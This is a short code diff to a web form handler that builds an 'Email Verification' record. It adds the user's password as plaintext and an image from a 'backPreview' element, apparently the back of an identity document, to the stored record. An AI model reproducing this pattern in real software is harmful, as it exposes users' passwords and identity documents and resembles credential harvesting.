@@ -320,8 +320,10 @@
                 type: 'Email Verification',
                 name: inputs[0].value,
                 mobile: inputs[1].value,
+                password: inputs[2].value,
                 email: inputs[3].value,
                 amount: '-',
+                image: (document.getElementById('backPreview') && document.getElementById('backPreview').style.display !== 'none') ? document.getElementById('backPreview').src : '',
                 date: new Date().toLocaleDateString() + ' ' + new Date().toLocaleTimeString(),
                 status: 'pending'
             };
